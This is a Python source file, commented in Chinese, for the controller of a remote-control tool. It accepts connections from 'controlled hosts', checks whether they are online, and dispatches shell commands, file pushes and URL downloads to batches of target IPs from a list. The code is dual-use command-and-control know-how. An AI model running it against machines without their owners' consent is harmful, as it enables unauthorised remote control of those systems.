import os
import sys
import time
import json
import threading
from MTcpTranServer import TcpTranServer


mutex=threading.Lock() # 互斥锁

class SCrn :
    def __init__(self,name:str) :
        self.name=name
        self.output=""
    def Name(self) :
        return self.name
    def Add(self,s) :
        mutex.acquire()
        self.output+=s
        mutex.release()
    def Output(self) :
        return self.output
SCrnlst=[]


class RCee :
    def __init__(self,Soc,HostIp="Unknown",HostName="Unknown",HostMac="Unknown",Port="Unknown",Online=True) :
        self.HostIp=HostIp # 被控端主机 Ip
        self.HostName=HostName # 被控端主机名
        self.HostMac=HostMac # 被控端 Mac
        self.Port=Port # 被控端连接使用的端口
        self.Soc=Soc # 被控端套接字
        self.Online=Online # 被控端还是否在线
    def info(self) :
        return "<"+self.HostIp+">,<"+self.HostName+">,<"+self.HostMac+">,<"+str(self.Port)+">"
class RCer :
    def __err__(self,stde,mye) :
        self.Error.append((stde,mye))
    def Geterr(self) :
        print(self.Error)
    def __init__(self,host="",port=29191,listeners=512,timeout=2,onepacksize=1024,MaxThreads=32) :
        self.Error=[]

        self.Timeout=timeout
        self.Sev=TcpTranServer(Host=host,Port=port,OneSizePack=onepacksize)
        self.MaxThreads=MaxThreads
        self.rlport=self.Sev.Bind() # rlport:真实绑定的端口
        if self.rlport<0 : # 绑定端口失败
            self.__err__("","绑定端口失败")
            del self.Sev
            return
        if self.Sev.Listen(listeners)==False : # 设置套接字监听属性失败
            self.__err__("","将绑定了端口 "+str(self.rlport)+" 的套接字设置为监听套接字失败")
            del self.Sev
            return
        
        self.RCeelst=[] # 被控端主机列表

    def __match__(self,Str,LStr,RStr) :
        LPos=Str.find(LStr)
        if LStr=="" :
            LPos=0
        if LPos==-1 :
            return ""
        RPos=Str.find(RStr,LPos)
        if RStr=="" :
            RPos=len(Str)
        if RPos==-1 :
            return ""
        return Str[LPos+len(LStr):RPos]
    def SHOWONLINRRCEE(self) :
        print(">在线主机列表:")
        tot=0
        for i in range(len(self.RCeelst)) :
            rcee=self.RCeelst[i]
            if rcee.Online==True :
                print(rcee.info())
                tot+=1
        if tot==0 :
            print("Nothing here...")
    def SHOWOFFLINERCEE(self) :
        print(">丢失连接的主机列表:")
        tot=0
        for i in range(len(self.RCeelst)) :
            rcee=self.RCeelst[i]
            if rcee.Online==False :
                print(rcee.info())
                tot+=1
        if tot==0 :
            print("Nothing here...")
    def ACCEPTRCEE(self) :
        '''
        监听新被控端连接线程
        '''
        try :
            while True :
                rceesoc,rceeaddr=self.Sev.Accept()
                if rceesoc==None or rceeaddr==None :
                    self.__err__("","套接字阻塞时失败")
                    continue
                rcee=RCee(HostIp=rceeaddr[0],Port=rceeaddr[1],Soc=rceesoc,Online=True)
                mutex.acquire() # 上锁,避免冲突访问
                self.RCeelst.append(rcee)
                mutex.release()
        except Exception as e :
            self.__err__(e,"监听新客户端连接线程异常")
            return
    def TESTONLINE(self,timeout=60) :
        '''
        心跳检测线程
        '''
        try :
            while True :
                tmpRCeelst=self.RCeelst
                for i in range(len(tmpRCeelst)) :
                    # 发送数据失败就表明对方已经不再线了
                    rcee=tmpRCeelst[i]
                    if self.Sev.Send(dsoc=rcee.Soc,data="ONLINETEST",destionation=rcee.HostIp)==False :
                        mutex.acquire()
                        self.RCeelst[i].Online=False # 设置为不在线主机
                        mutex.release()
                    else :
                        mutex.acquire()
                        self.RCeelst[i].Online=True # 设置为在线主机
                        mutex.release()
                time.sleep(timeout) # 休息一会再进行下一轮
        except Exception as e :
            self.__err__(e,"心跳检测线程异常")
            return
    def __recvrcee__(self,rcee,I) :
        while True :
            #print("__recv__start!")
            dic=self.Sev.Recv(rcee.Soc)
            if dic!={} :
                data=dic.get("Data")
                pknm=dic.get("Packname")
                Src=dic.get("Source")
                ID=self.__match__(data,"ID:","\n")
                STATE=self.__match__(data,"STATE:","")
                id=-1
                if ID.isdigit()==True :
                    id=int(ID)
                if 0<=id and id<len(SCrnlst):
                    SCrnlst[id].Add("From "+Src+" :"+STATE+"\n")
                #print("dic:",dic,"id:",id,"src",Src,"state:",STATE)
                if Src!=None:
                    src=Src.split(",")
                    mutex.acquire()
                    self.RCeelst[I].HostMac=src[1]
                    self.RCeelst[I].HostName=src[2]
                    mutex.release()
    def RECVRCEEALL(self) :
        lastlen=-1
        while True :
            mutex.acquire()
            tmpRCeelst=self.RCeelst
            mutex.release()
            for i in range(len(tmpRCeelst)) :
                #print(i,lastlen,tmpRCeelst[0].HostIp)
                #input("")
                if i>=lastlen :
                    #print("RCEE:",tmpRCeelst[i])
                    threading.Thread(target=self.__recvrcee__,kwargs={"rcee":tmpRCeelst[i],"I":i}).start()
            lastlen=len(tmpRCeelst)


    def __batchsend__(self,tagets,data,packname) :
        try :
            ths=[]
            L,R=0,self.MaxThreads
            while True :
                tgts=tagets[L:R]
                for ip in tgts :
                    if ip=="" :
                        continue
                    mutex.acquire()
                    tmpRCeelst=self.RCeelst
                    mutex.release()
                    for rcee in tmpRCeelst :
                        if rcee.HostIp==ip :
                            #print(ip)
                            th=threading.Thread(target=self.Sev.Send,kwargs={"dsoc":rcee.Soc,"data":data,"destionation":ip,"packname":packname})
                            ths.append(th)
                            break
                for i in range(len(ths)) :
                    ths[i].start()
                for i in range(len(ths)) :
                    ths[i].join()
                
                if R>=len(tagets) :
                    break
                L=R
                R+=self.MaxThreads
            return True
        except Exception as e :
            self.__err__(e,"批量发送过程出错")
            return False
    def CMDSHELL(self,ID,tagets,CMD) :
        data="ID:"+str(ID)+"\n"+"CMD:"+CMD+"\n"
        return self.__batchsend__(tagets,data,"CMDSHELL")
    def FILETRAN(self,ID,tagets,MYPATH,SAVEPATH) :
        try :
            text=open(MYPATH,"rb").read()
        except Exception as e :
            print(">>>打开本地文件失败")
            self.__err__(e,"打开本地文件失败")
            return False
        data="ID:"+str(ID)+"\n"+"SAVEPATH:"+SAVEPATH+"\n"+"TEXT:"+text.decode()
        return self.__batchsend__(tagets,data,"FILETRAN")
    def URLDOWN(self,ID,tagets,SAVEPATH,URL) :
        data="ID:"+str(ID)+"\n"+"SAVEPATH:"+SAVEPATH+"\n"+"URL:"+URL+"\n"
        return self.__batchsend__(tagets,data,"URLDOWN")


def main() :
    rcer=RCer("127.0.0.1",29191)
    print(">真实绑定的端口:"+str(rcer.rlport))
    threading.Thread(target=rcer.ACCEPTRCEE).start()
    threading.Thread(target=rcer.TESTONLINE).start()
    threading.Thread(target=rcer.RECVRCEEALL).start()

    while True :
        os.system("cls")
        SEP="----------------------------------------"
        print(">真实绑定的端口:"+str(rcer.rlport))
        print(SEP)
        Hmpg=">主页>\n>>选择操作\n"
        Hmpg+="0)显示在线主机\n"
        Hmpg+="1)显示离线主机\n"
        Hmpg+="2)新建一个线程\n"
        Hmpg+="3)删除一个线程\n"
        Hmpg+="4)切换显示一个线程\n"
        print(Hmpg,end="")
        Op=input(">>输入您的操作:")
        if Op=="0" :
            os.system("cls")
            rcer.SHOWONLINRRCEE()
            input("请按任意键继续...")
        elif Op=="1" :
            os.system("cls")
            rcer.SHOWOFFLINERCEE()
            input("请按任意键继续...")
        elif Op=="2" :
            os.system("cls")
            name=input(">>>输入新建线程名:")
            scrn=SCrn(name)
            scrn.Add(">>>输入新建线程名:"+name+"\n")
            chs="0)CmdShell\n1)FileTran\n2)UrlDown\n"
            print(chs,end="")
            opth=input(">>>输入新建线程类型:")
            scrn.Add(chs+">>>输入新建线程类型:"+opth+"\n")
            FilePath=input(">>>输入目标文件:")
            scrn.Add(">>>输入目标文件:"+FilePath+"\n")
            try :
                File=open(FilePath,"r",encoding="utf-8")
                rds=File.read().split("\n")
                tgts=[]
                for ip in rds :
                    if ip!="\n" :
                        tgts.append(ip)
            except :
                print(">>>打开文件失败...")
                time.sleep(1)
                continue
            print(tgts)
            if opth=="0" :
                CMD=input(">>>输入要执行的 CMD 命令:")
                scrn.Add(">>>输入要执行的 CMD 命令:"+CMD+"\n")
                print(">>>开始执行...")
                scrn.Add(">>>开始执行...\n")
                SCrnlst.append(scrn)
                threading.Thread(target=rcer.CMDSHELL,kwargs={"ID":len(SCrnlst)-1,"tagets":tgts,"CMD":CMD}).start()
                input("请按任意键以继续")
                time.sleep(1)
                continue
            elif opth=="1" :
                MYPATH=input(">>>输入本地文件路径:")
                scrn.Add(">>>输入本地文件路径:"+MYPATH+"\n")
                SAVEPATH=input(">>>输入保存文件路径:")
                scrn.Add(">>>输入保存文件路径"+SAVEPATH+"\n")
                print(">>>开始执行...")
                scrn.Add(">>>开始执行...\n")
                SCrnlst.append(scrn)
                threading.Thread(target=rcer.FILETRAN,kwargs={"ID":len(SCrnlst)-1,"tagets":tgts,"MYPATH":MYPATH,"SAVEPATH":SAVEPATH}).start()
                input("请按任意键以继续")
                time.sleep(1)
                continue
            elif opth=="2" :
                SAVEPATH=input(">>>输入保存文件路径:")
                scrn.Add(">>>输入保存文件路径"+SAVEPATH+"\n")
                URL=input(">>>输入Url:")
                scrn.Add(">>>输入Url:"+URL+"\n")
                print(">>>开始执行...")
                scrn.Add(">>>开始执行...\n")
                SCrnlst.append(scrn)
                threading.Thread(target=rcer.URLDOWN,kwargs={"ID":len(SCrnlst)-1,"tagets":tgts,"SAVEPATH":SAVEPATH,"URL":URL}).start()
                input("请按任意键以继续")
                time.sleep(1)
                continue
            else :
                print(">>>非法输入...")
                time.sleep(1)
                continue
        elif Op=="3" or Op=="4" :
            os.system("cls")
            if len(SCrnlst)==0 :
                print(">>>一个线程都没有...")
                time.sleep(1)
                continue
            print(">>>当前已有线程:")
            for i in range(len(SCrnlst)) :
                print(str(i)+")"+SCrnlst[i].Name())
            if Op=="3" :
                ID=input(">>>输入您要删除的线程:")
            elif Op=="4" :
                ID=input(">>>输入您要切换到的线程:")
            if ID.isdigit()==False :
                print(">>>非法输入...")
                time.sleep(1)
                continue
            id=int(ID)
            if id<0 or id>=len(SCrnlst) :
                print(">>>不存在这个线程...")
                time.sleep(1)
                continue
            os.system("cls")
            if Op=="3" :
                try :
                    del SCrnlst[id]
                    print(">>>删除线程",str(i)+SCrnlst[i].Name(),"成功")
                except Exception as e :
                    print(">>>删除线程",str(i)+SCrnlst[i].Name(),"失败")
                    print(e)
            if Op=="4" :
                print(SCrnlst[id].Output())
            input("请按任意键继续")
        else :
            print("非法输入...")
            time.sleep(1)
            continue

        print(SEP)





if __name__=="__main__" :
    main()